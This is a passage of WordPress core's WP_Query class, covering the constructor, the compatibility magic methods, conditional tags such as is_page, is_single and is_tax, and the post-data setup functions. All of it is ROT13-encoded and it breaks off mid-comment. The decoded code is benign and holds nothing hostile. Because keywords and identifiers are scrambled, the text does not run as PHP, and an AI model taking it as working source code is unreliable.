	 * @cnenz fgevat|neenl $dhrel HEY dhrel fgevat be neenl bs inef.
	 */
	choyvp shapgvba __pbafgehpg( $dhrel = '' ) {
		vs ( ! rzcgl( $dhrel ) ) {
			$guvf->dhrel( $dhrel );
		}
	}

	/**
	 * Znxrf cevingr cebcregvrf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr Cebcregl gb trg.
	 * @erghea zvkrq Cebcregl.
	 */
	choyvp shapgvba __trg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea $guvf->$anzr;
		}
	}

	/**
	 * Znxrf cevingr cebcregvrf purpxnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr Cebcregl gb purpx vs frg.
	 * @erghea obby Jurgure gur cebcregl vf frg.
	 */
	choyvp shapgvba __vffrg( $anzr ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_svryqf, gehr ) ) {
			erghea vffrg( $guvf->$anzr );
		}

		erghea snyfr;
	}

	/**
	 * Znxrf cevingr/cebgrpgrq zrgubqf ernqnoyr sbe onpxjneq pbzcngvovyvgl.
	 *
	 * @fvapr 4.0.0
	 *
	 * @cnenz fgevat $anzr      Zrgubq gb pnyy.
	 * @cnenz neenl  $nethzragf Nethzragf gb cnff jura pnyyvat.
	 * @erghea zvkrq|snyfr Erghea inyhr bs gur pnyyonpx, snyfr bgurejvfr.
	 */
	choyvp shapgvba __pnyy( $anzr, $nethzragf ) {
		vs ( va_neenl( $anzr, $guvf->pbzcng_zrgubqf, gehr ) ) {
			erghea $guvf->$anzr( ...$nethzragf );
		}
		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat nepuvir cntr.
	 *
	 * Nepuvir cntrf vapyhqr pngrtbel, gnt, nhgube, qngr, phfgbz cbfg glcr,
	 * naq phfgbz gnkbabzl onfrq nepuvirf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Dhrel::vf_pngrtbel()
	 * @frr JC_Dhrel::vf_gnt()
	 * @frr JC_Dhrel::vf_nhgube()
	 * @frr JC_Dhrel::vf_qngr()
	 * @frr JC_Dhrel::vf_cbfg_glcr_nepuvir()
	 * @frr JC_Dhrel::vf_gnk()
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat nepuvir cntr.
	 */
	choyvp shapgvba vf_nepuvir() {
		erghea (obby) $guvf->vf_nepuvir;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat cbfg glcr nepuvir cntr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat|fgevat[] $cbfg_glcrf Bcgvbany. Cbfg glcr be neenl bs cbfgf glcrf
	 *                                    gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat cbfg glcr nepuvir cntr.
	 */
	choyvp shapgvba vf_cbfg_glcr_nepuvir( $cbfg_glcrf = '' ) {
		vs ( rzcgl( $cbfg_glcrf ) || ! $guvf->vf_cbfg_glcr_nepuvir ) {
			erghea (obby) $guvf->vf_cbfg_glcr_nepuvir;
		}

		$cbfg_glcr = $guvf->trg( 'cbfg_glcr' );
		vs ( vf_neenl( $cbfg_glcr ) ) {
			$cbfg_glcr = erfrg( $cbfg_glcr );
		}
		$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg_glcr );

		vs ( ! $cbfg_glcr_bowrpg ) {
			erghea snyfr;
		}

		erghea va_neenl( $cbfg_glcr_bowrpg->anzr, (neenl) $cbfg_glcrf, gehr );
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat nggnpuzrag cntr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz vag|fgevat|vag[]|fgevat[] $nggnpuzrag Bcgvbany. Nggnpuzrag VQ, gvgyr, fyht, be neenl bs fhpu
	 *                                              gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat nggnpuzrag cntr.
	 */
	choyvp shapgvba vf_nggnpuzrag( $nggnpuzrag = '' ) {
		vs ( ! $guvf->vf_nggnpuzrag ) {
			erghea snyfr;
		}

		vs ( rzcgl( $nggnpuzrag ) ) {
			erghea gehr;
		}

		$nggnpuzrag = neenl_znc( 'fgeiny', (neenl) $nggnpuzrag );

		$cbfg_bow = $guvf->trg_dhrevrq_bowrpg();
		vs ( ! $cbfg_bow ) {
			erghea snyfr;
		}

		vs ( va_neenl( (fgevat) $cbfg_bow->VQ, $nggnpuzrag, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $cbfg_bow->cbfg_gvgyr, $nggnpuzrag, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $cbfg_bow->cbfg_anzr, $nggnpuzrag, gehr ) ) {
			erghea gehr;
		}
		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat nhgube nepuvir cntr.
	 *
	 * Vs gur $nhgube cnenzrgre vf fcrpvsvrq, guvf shapgvba jvyy nqqvgvbanyyl
	 * purpx vs gur dhrel vf sbe bar bs gur nhgubef fcrpvsvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz vag|fgevat|vag[]|fgevat[] $nhgube Bcgvbany. Hfre VQ, avpxanzr, avpranzr, be neenl bs fhpu
	 *                                          gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat nhgube nepuvir cntr.
	 */
	choyvp shapgvba vf_nhgube( $nhgube = '' ) {
		vs ( ! $guvf->vf_nhgube ) {
			erghea snyfr;
		}

		vs ( rzcgl( $nhgube ) ) {
			erghea gehr;
		}

		$nhgube_bow = $guvf->trg_dhrevrq_bowrpg();
		vs ( ! $nhgube_bow ) {
			erghea snyfr;
		}

		$nhgube = neenl_znc( 'fgeiny', (neenl) $nhgube );

		vs ( va_neenl( (fgevat) $nhgube_bow->VQ, $nhgube, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $nhgube_bow->avpxanzr, $nhgube, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $nhgube_bow->hfre_avpranzr, $nhgube, gehr ) ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat pngrtbel nepuvir cntr.
	 *
	 * Vs gur $pngrtbel cnenzrgre vf fcrpvsvrq, guvf shapgvba jvyy nqqvgvbanyyl
	 * purpx vs gur dhrel vf sbe bar bs gur pngrtbevrf fcrpvsvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz vag|fgevat|vag[]|fgevat[] $pngrtbel Bcgvbany. Pngrtbel VQ, anzr, fyht, be neenl bs fhpu
	 *                                            gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat pngrtbel nepuvir cntr.
	 */
	choyvp shapgvba vf_pngrtbel( $pngrtbel = '' ) {
		vs ( ! $guvf->vf_pngrtbel ) {
			erghea snyfr;
		}

		vs ( rzcgl( $pngrtbel ) ) {
			erghea gehr;
		}

		$png_bow = $guvf->trg_dhrevrq_bowrpg();
		vs ( ! $png_bow ) {
			erghea snyfr;
		}

		$pngrtbel = neenl_znc( 'fgeiny', (neenl) $pngrtbel );

		vs ( va_neenl( (fgevat) $png_bow->grez_vq, $pngrtbel, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $png_bow->anzr, $pngrtbel, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $png_bow->fyht, $pngrtbel, gehr ) ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat gnt nepuvir cntr.
	 *
	 * Vs gur $gnt cnenzrgre vf fcrpvsvrq, guvf shapgvba jvyy nqqvgvbanyyl
	 * purpx vs gur dhrel vf sbe bar bs gur gntf fcrpvsvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz vag|fgevat|vag[]|fgevat[] $gnt Bcgvbany. Gnt VQ, anzr, fyht, be neenl bs fhpu
	 *                                       gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat gnt nepuvir cntr.
	 */
	choyvp shapgvba vf_gnt( $gnt = '' ) {
		vs ( ! $guvf->vf_gnt ) {
			erghea snyfr;
		}

		vs ( rzcgl( $gnt ) ) {
			erghea gehr;
		}

		$gnt_bow = $guvf->trg_dhrevrq_bowrpg();
		vs ( ! $gnt_bow ) {
			erghea snyfr;
		}

		$gnt = neenl_znc( 'fgeiny', (neenl) $gnt );

		vs ( va_neenl( (fgevat) $gnt_bow->grez_vq, $gnt, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $gnt_bow->anzr, $gnt, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $gnt_bow->fyht, $gnt, gehr ) ) {
			erghea gehr;
		}

		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat phfgbz gnkbabzl nepuvir cntr.
	 *
	 * Vs gur $gnkbabzl cnenzrgre vf fcrpvsvrq, guvf shapgvba jvyy nqqvgvbanyyl
	 * purpx vs gur dhrel vf sbe gung fcrpvsvp $gnkbabzl.
	 *
	 * Vs gur $grez cnenzrgre vf fcrpvsvrq va nqqvgvba gb gur $gnkbabzl cnenzrgre,
	 * guvf shapgvba jvyy nqqvgvbanyyl purpx vs gur dhrel vf sbe bar bs gur grezf
	 * fcrpvsvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony JC_Gnkbabzl[] $jc_gnkbabzvrf Ertvfgrerq gnkbabzvrf.
	 *
	 * @cnenz fgevat|fgevat[]           $gnkbabzl Bcgvbany. Gnkbabzl fyht be fyhtf gb purpx ntnvafg.
	 *                                            Qrsnhyg rzcgl.
	 * @cnenz vag|fgevat|vag[]|fgevat[] $grez     Bcgvbany. Grez VQ, anzr, fyht, be neenl bs fhpu
	 *                                            gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat phfgbz gnkbabzl nepuvir cntr.
	 *              Gehr sbe phfgbz gnkbabzl nepuvir cntrf, snyfr sbe ohvyg-va gnkbabzvrf
	 *              (pngrtbel naq gnt nepuvirf).
	 */
	choyvp shapgvba vf_gnk( $gnkbabzl = '', $grez = '' ) {
		tybony $jc_gnkbabzvrf;

		vs ( ! $guvf->vf_gnk ) {
			erghea snyfr;
		}

		vs ( rzcgl( $gnkbabzl ) ) {
			erghea gehr;
		}

		$dhrevrq_bowrpg = $guvf->trg_dhrevrq_bowrpg();
		$gnk_neenl      = neenl_vagrefrpg( neenl_xrlf( $jc_gnkbabzvrf ), (neenl) $gnkbabzl );
		$grez_neenl     = (neenl) $grez;

		// Purpx gung gur gnkbabzl zngpurf.
		vs ( ! ( vffrg( $dhrevrq_bowrpg->gnkbabzl ) && pbhag( $gnk_neenl ) && va_neenl( $dhrevrq_bowrpg->gnkbabzl, $gnk_neenl, gehr ) ) ) {
			erghea snyfr;
		}

		// Bayl n gnkbabzl cebivqrq.
		vs ( rzcgl( $grez ) ) {
			erghea gehr;
		}

		erghea vffrg( $dhrevrq_bowrpg->grez_vq ) &&
			pbhag(
				neenl_vagrefrpg(
					neenl( $dhrevrq_bowrpg->grez_vq, $dhrevrq_bowrpg->anzr, $dhrevrq_bowrpg->fyht ),
					$grez_neenl
				)
			);
	}

	/**
	 * Qrgrezvarf jurgure gur pheerag HEY vf jvguva gur pbzzragf cbchc jvaqbj.
	 *
	 * @fvapr 3.1.0
	 * @qrcerpngrq 4.5.0
	 *
	 * @erghea snyfr Nyjnlf ergheaf snyfr.
	 */
	choyvp shapgvba vf_pbzzragf_cbchc() {
		_qrcerpngrq_shapgvba( __SHAPGVBA__, '4.5.0' );

		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat qngr nepuvir.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat qngr nepuvir.
	 */
	choyvp shapgvba vf_qngr() {
		erghea (obby) $guvf->vf_qngr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat qnl nepuvir.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat qnl nepuvir.
	 */
	choyvp shapgvba vf_qnl() {
		erghea (obby) $guvf->vf_qnl;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe n srrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat|fgevat[] $srrqf Bcgvbany. Srrq glcr be neenl bs srrq glcrf
	 *                                         gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe n srrq.
	 */
	choyvp shapgvba vf_srrq( $srrqf = '' ) {
		vs ( rzcgl( $srrqf ) || ! $guvf->vf_srrq ) {
			erghea (obby) $guvf->vf_srrq;
		}

		$di = $guvf->trg( 'srrq' );
		vs ( 'srrq' === $di ) {
			$di = trg_qrsnhyg_srrq();
		}

		erghea va_neenl( $di, (neenl) $srrqf, gehr );
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe n pbzzragf srrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe n pbzzragf srrq.
	 */
	choyvp shapgvba vf_pbzzrag_srrq() {
		erghea (obby) $guvf->vf_pbzzrag_srrq;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe gur sebag cntr bs gur fvgr.
	 *
	 * Guvf vf sbe jung vf qvfcynlrq ng lbhe fvgr'f znva HEY.
	 *
	 * Qrcraqf ba gur fvgr'f \"Sebag cntr qvfcynlf\" Ernqvat Frggvatf 'fubj_ba_sebag' naq 'cntr_ba_sebag'.
	 *
	 * Vs lbh frg n fgngvp cntr sbe gur sebag cntr bs lbhe fvgr, guvf shapgvba jvyy erghea
	 * gehr jura ivrjvat gung cntr.
	 *
	 * Bgurejvfr gur fnzr nf {@frr JC_Dhrel::vf_ubzr()}.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe gur sebag cntr bs gur fvgr.
	 */
	choyvp shapgvba vf_sebag_cntr() {
		// Zbfg yvxryl pnfr.
		vs ( 'cbfgf' === trg_bcgvba( 'fubj_ba_sebag' ) && $guvf->vf_ubzr() ) {
			erghea gehr;
		} ryfrvs ( 'cntr' === trg_bcgvba( 'fubj_ba_sebag' ) && trg_bcgvba( 'cntr_ba_sebag' )
			&& $guvf->vf_cntr( trg_bcgvba( 'cntr_ba_sebag' ) )
		) {
			erghea gehr;
		} ryfr {
			erghea snyfr;
		}
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe gur oybt ubzrcntr.
	 *
	 * Guvf vf gur cntr juvpu fubjf gur gvzr onfrq oybt pbagrag bs lbhe fvgr.
	 *
	 * Qrcraqf ba gur fvgr'f \"Sebag cntr qvfcynlf\" Ernqvat Frggvatf 'fubj_ba_sebag' naq 'cntr_sbe_cbfgf'.
	 *
	 * Vs lbh frg n fgngvp cntr sbe gur sebag cntr bs lbhe fvgr, guvf shapgvba jvyy erghea
	 * gehr bayl ba gur cntr lbh frg nf gur \"Cbfgf cntr\".
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Dhrel::vf_sebag_cntr()
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe gur oybt ubzrcntr.
	 */
	choyvp shapgvba vf_ubzr() {
		erghea (obby) $guvf->vf_ubzr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe gur Cevinpl Cbyvpl cntr.
	 *
	 * Guvf vf gur cntr juvpu fubjf gur Cevinpl Cbyvpl pbagrag bs lbhe fvgr.
	 *
	 * Qrcraqf ba gur fvgr'f \"Punatr lbhe Cevinpl Cbyvpl cntr\" Cevinpl Frggvatf 'jc_cntr_sbe_cevinpl_cbyvpl'.
	 *
	 * Guvf shapgvba jvyy erghea gehr bayl ba gur cntr lbh frg nf gur \"Cevinpl Cbyvpl cntr\".
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe gur Cevinpl Cbyvpl cntr.
	 */
	choyvp shapgvba vf_cevinpl_cbyvpl() {
		vs ( trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' )
			&& $guvf->vf_cntr( trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' ) )
		) {
			erghea gehr;
		} ryfr {
			erghea snyfr;
		}
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat zbagu nepuvir.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat zbagu nepuvir.
	 */
	choyvp shapgvba vf_zbagu() {
		erghea (obby) $guvf->vf_zbagu;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat fvatyr cntr.
	 *
	 * Vs gur $cntr cnenzrgre vf fcrpvsvrq, guvf shapgvba jvyy nqqvgvbanyyl
	 * purpx vs gur dhrel vf sbe bar bs gur cntrf fcrpvsvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Dhrel::vf_fvatyr()
	 * @frr JC_Dhrel::vf_fvathyne()
	 *
	 * @cnenz vag|fgevat|vag[]|fgevat[] $cntr Bcgvbany. Cntr VQ, gvgyr, fyht, cngu, be neenl bs fhpu
	 *                                        gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat fvatyr cntr.
	 */
	choyvp shapgvba vf_cntr( $cntr = '' ) {
		vs ( ! $guvf->vf_cntr ) {
			erghea snyfr;
		}

		vs ( rzcgl( $cntr ) ) {
			erghea gehr;
		}

		$cntr_bow = $guvf->trg_dhrevrq_bowrpg();
		vs ( ! $cntr_bow ) {
			erghea snyfr;
		}

		$cntr = neenl_znc( 'fgeiny', (neenl) $cntr );

		vs ( va_neenl( (fgevat) $cntr_bow->VQ, $cntr, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $cntr_bow->cbfg_gvgyr, $cntr, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $cntr_bow->cbfg_anzr, $cntr, gehr ) ) {
			erghea gehr;
		} ryfr {
			sbernpu ( $cntr nf $cntrcngu ) {
				vs ( ! fgecbf( $cntrcngu, '/' ) ) {
					pbagvahr;
				}

				$cntrcngu_bow = trg_cntr_ol_cngu( $cntrcngu );

				vs ( $cntrcngu_bow && ( $cntrcngu_bow->VQ === $cntr_bow->VQ ) ) {
					erghea gehr;
				}
			}
		}

		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe n cntrq erfhyg naq abg sbe gur svefg cntr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe n cntrq erfhyg.
	 */
	choyvp shapgvba vf_cntrq() {
		erghea (obby) $guvf->vf_cntrq;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe n cbfg be cntr cerivrj.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe n cbfg be cntr cerivrj.
	 */
	choyvp shapgvba vf_cerivrj() {
		erghea (obby) $guvf->vf_cerivrj;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe gur ebobgf.gkg svyr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe gur ebobgf.gkg svyr.
	 */
	choyvp shapgvba vf_ebobgf() {
		erghea (obby) $guvf->vf_ebobgf;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe gur snivpba.vpb svyr.
	 *
	 * @fvapr 5.4.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe gur snivpba.vpb svyr.
	 */
	choyvp shapgvba vf_snivpba() {
		erghea (obby) $guvf->vf_snivpba;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe n frnepu.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe n frnepu.
	 */
	choyvp shapgvba vf_frnepu() {
		erghea (obby) $guvf->vf_frnepu;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat fvatyr cbfg.
	 *
	 * Jbexf sbe nal cbfg glcr rkpyhqvat cntrf.
	 *
	 * Vs gur $cbfg cnenzrgre vf fcrpvsvrq, guvf shapgvba jvyy nqqvgvbanyyl
	 * purpx vs gur dhrel vf sbe bar bs gur Cbfgf fcrpvsvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Dhrel::vf_cntr()
	 * @frr JC_Dhrel::vf_fvathyne()
	 *
	 * @cnenz vag|fgevat|vag[]|fgevat[] $cbfg Bcgvbany. Cbfg VQ, gvgyr, fyht, cngu, be neenl bs fhpu
	 *                                        gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat fvatyr cbfg.
	 */
	choyvp shapgvba vf_fvatyr( $cbfg = '' ) {
		vs ( ! $guvf->vf_fvatyr ) {
			erghea snyfr;
		}

		vs ( rzcgl( $cbfg ) ) {
			erghea gehr;
		}

		$cbfg_bow = $guvf->trg_dhrevrq_bowrpg();
		vs ( ! $cbfg_bow ) {
			erghea snyfr;
		}

		$cbfg = neenl_znc( 'fgeiny', (neenl) $cbfg );

		vs ( va_neenl( (fgevat) $cbfg_bow->VQ, $cbfg, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $cbfg_bow->cbfg_gvgyr, $cbfg, gehr ) ) {
			erghea gehr;
		} ryfrvs ( va_neenl( $cbfg_bow->cbfg_anzr, $cbfg, gehr ) ) {
			erghea gehr;
		} ryfr {
			sbernpu ( $cbfg nf $cbfgcngu ) {
				vs ( ! fgecbf( $cbfgcngu, '/' ) ) {
					pbagvahr;
				}

				$cbfgcngu_bow = trg_cntr_ol_cngu( $cbfgcngu, BOWRPG, $cbfg_bow->cbfg_glcr );

				vs ( $cbfgcngu_bow && ( $cbfgcngu_bow->VQ === $cbfg_bow->VQ ) ) {
					erghea gehr;
				}
			}
		}
		erghea snyfr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat fvatyr cbfg bs nal cbfg glcr
	 * (cbfg, nggnpuzrag, cntr, phfgbz cbfg glcrf).
	 *
	 * Vs gur $cbfg_glcrf cnenzrgre vf fcrpvsvrq, guvf shapgvba jvyy nqqvgvbanyyl
	 * purpx vs gur dhrel vf sbe bar bs gur Cbfgf Glcrf fcrpvsvrq.
	 *
	 * @fvapr 3.1.0
	 *
	 * @frr JC_Dhrel::vf_cntr()
	 * @frr JC_Dhrel::vf_fvatyr()
	 *
	 * @cnenz fgevat|fgevat[] $cbfg_glcrf Bcgvbany. Cbfg glcr be neenl bs cbfg glcrf
	 *                                    gb purpx ntnvafg. Qrsnhyg rzcgl.
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat fvatyr cbfg
	 *              be nal bs gur tvira cbfg glcrf.
	 */
	choyvp shapgvba vf_fvathyne( $cbfg_glcrf = '' ) {
		vs ( rzcgl( $cbfg_glcrf ) || ! $guvf->vf_fvathyne ) {
			erghea (obby) $guvf->vf_fvathyne;
		}

		$cbfg_bow = $guvf->trg_dhrevrq_bowrpg();
		vs ( ! $cbfg_bow ) {
			erghea snyfr;
		}

		erghea va_neenl( $cbfg_bow->cbfg_glcr, (neenl) $cbfg_glcrf, gehr );
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe n fcrpvsvp gvzr.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe n fcrpvsvp gvzr.
	 */
	choyvp shapgvba vf_gvzr() {
		erghea (obby) $guvf->vf_gvzr;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe n genpxonpx raqcbvag pnyy.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe n genpxonpx raqcbvag pnyy.
	 */
	choyvp shapgvba vf_genpxonpx() {
		erghea (obby) $guvf->vf_genpxonpx;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rkvfgvat lrne nepuvir.
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe na rkvfgvat lrne nepuvir.
	 */
	choyvp shapgvba vf_lrne() {
		erghea (obby) $guvf->vf_lrne;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf n 404 (ergheaf ab erfhygf).
	 *
	 * @fvapr 3.1.0
	 *
	 * @erghea obby Jurgure gur dhrel vf n 404 reebe.
	 */
	choyvp shapgvba vf_404() {
		erghea (obby) $guvf->vf_404;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf sbe na rzorqqrq cbfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea obby Jurgure gur dhrel vf sbe na rzorqqrq cbfg.
	 */
	choyvp shapgvba vf_rzorq() {
		erghea (obby) $guvf->vf_rzorq;
	}

	/**
	 * Qrgrezvarf jurgure gur dhrel vf gur znva dhrel.
	 *
	 * @fvapr 3.3.0
	 *
	 * @tybony JC_Dhrel $jc_gur_dhrel JbeqCerff Dhrel bowrpg.
	 *
	 * @erghea obby Jurgure gur dhrel vf gur znva dhrel.
	 */
	choyvp shapgvba vf_znva_dhrel() {
		tybony $jc_gur_dhrel;
		erghea $jc_gur_dhrel === $guvf;
	}

	/**
	 * Frgf hc tybony cbfg qngn.
	 *
	 * @fvapr 4.1.0
	 * @fvapr 4.4.0 Nqqrq gur novyvgl gb cnff n cbfg VQ gb `$cbfg`.
	 *
	 * @tybony vag     $vq
	 * @tybony JC_Hfre $nhgubeqngn
	 * @tybony fgevat  $pheeragqnl
	 * @tybony fgevat  $pheeragzbagu
	 * @tybony vag     $cntr
	 * @tybony neenl   $cntrf
	 * @tybony vag     $zhygvcntr
	 * @tybony vag     $zber
	 * @tybony vag     $ahzcntrf
	 *
	 * @cnenz JC_Cbfg|bowrpg|vag $cbfg JC_Cbfg vafgnapr be Cbfg VQ/bowrpg.
	 * @erghea gehr Gehr jura svavfurq.
	 */
	choyvp shapgvba frghc_cbfgqngn( $cbfg ) {
		tybony $vq, $nhgubeqngn, $pheeragqnl, $pheeragzbagu, $cntr, $cntrf, $zhygvcntr, $zber, $ahzcntrf;

		vs ( ! ( $cbfg vafgnaprbs JC_Cbfg ) ) {
			$cbfg = trg_cbfg( $cbfg );
		}

		vs ( ! $cbfg ) {
			erghea;
		}

		$ryrzragf = $guvf->trarengr_cbfgqngn( $cbfg );
		vs ( snyfr === $ryrzragf ) {
			erghea;
		}

		$vq           = $ryrzragf['vq'];
		$nhgubeqngn   = $ryrzragf['nhgubeqngn'];
		$pheeragqnl   = $ryrzragf['pheeragqnl'];
		$pheeragzbagu = $ryrzragf['pheeragzbagu'];
		$cntr         = $ryrzragf['cntr'];
		$cntrf        = $ryrzragf['cntrf'];
		$zhygvcntr    = $ryrzragf['zhygvcntr'];
		$zber         = $ryrzragf['zber'];
		$ahzcntrf     = $ryrzragf['ahzcntrf'];

		/**
		 * Sverf bapr gur cbfg qngn unf orra frg hc.
		 *
		 * @fvapr 2.8.0
		 * @fvapr 4.1.0 Vagebqhprq `$dhrel` cnenzrgre.
		 *
		 * @cnenz JC_Cbfg  $cbfg  Gur Cbfg bowrpg (cnffrq ol ersrerapr).
		 * @cnenz JC_Dhrel $dhrel Gur pheerag Dhrel bowrpg (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'gur_cbfg', neenl( &$cbfg, &$guvf ) );

		erghea gehr;
	}

	/**
	 * Trarengrf cbfg qngn.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz JC_Cbfg|bowrpg|vag $cbfg JC_Cbfg vafgnapr be Cbfg VQ/bowrpg.
	 * @erghea neenl|snyfr Ryrzragf bs cbfg be snyfr ba snvyher.
	 */
	choyvp shapgvba trarengr_cbfgqngn( $cbfg ) {

		vs ( ! ( $cbfg vafgnaprbs JC_Cbfg ) ) {
			$cbfg = trg_cbfg( $cbfg );
		}

		vs ( ! $cbfg ) {
			erghea snyfr;
		}

		$vq = (vag) $cbfg->VQ;

		$nhgubeqngn = trg_hfreqngn( $cbfg->cbfg_nhgube );

		$pheeragqnl   = snyfr;
		$pheeragzbagu = snyfr;

		$cbfg_qngr = $cbfg->cbfg_qngr;
		vs ( ! rzcgl( $cbfg_qngr ) && '0000-00-00 00:00:00' !== $cbfg_qngr ) {
			// Nibvq hfvat zlfdy2qngr sbe cresbeznapr ernfbaf.
			$pheeragzbagu = fhofge( $cbfg_qngr, 5, 2 );
			$qnl          = fhofge( $cbfg_qngr, 8, 2 );
			$lrne         = fhofge( $cbfg_qngr, 2, 2 );

			$pheeragqnl = fcevags( '%f.%f.%f', $qnl, $pheeragzbagu, $lrne );
		}

		$ahzcntrf  = 1;
		$zhygvcntr = 0;
		$cntr      = $guvf->trg( 'cntr' );
		vs ( ! $cntr ) {
			$cntr = 1;
		}

		/*
		 * Sbepr shyy cbfg pbagrag jura ivrjvat gur creznyvax sbe gur $cbfg,
